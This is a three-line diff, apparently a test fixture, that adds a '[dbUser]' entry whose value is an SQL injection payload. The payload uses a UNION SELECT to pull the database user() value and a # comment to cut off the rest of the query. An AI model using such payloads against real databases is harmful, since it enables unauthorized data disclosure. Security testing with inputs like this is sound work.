@@ -1,0 +1,3 @@
+[dbUser] abcd' union select 'aaa',user(),'aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','hhh','jjj', 'kkk'#Comment
+
+
